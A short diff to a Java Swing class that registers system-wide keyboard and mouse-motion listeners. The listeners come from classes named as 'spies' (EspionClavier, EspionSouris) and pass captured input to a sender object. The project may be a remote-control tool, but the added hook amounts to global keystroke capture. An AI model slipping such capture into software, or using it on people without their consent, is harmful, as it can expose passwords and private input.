@@ -5,6 +5,7 @@
  */
 package sd_project;
 
+import Espions.EspionClavier;
 import Espions.EspionSouris;
 import controllers.Ordinateur;
 import controllers.Sender;
@@ -222,5 +223,8 @@ public class ScreenOne extends javax.swing.JFrame{
         GlobalScreen.registerNativeHook();
         EspionSouris eS = new EspionSouris(ordi.getSender());
         GlobalScreen.addNativeMouseListener(eS);
+        GlobalScreen.addNativeMouseMotionListener(eS);
+        EspionClavier eC = new EspionClavier(ordi.getSender());
+        GlobalScreen.addNativeKeyListener(eC);
     }
 }
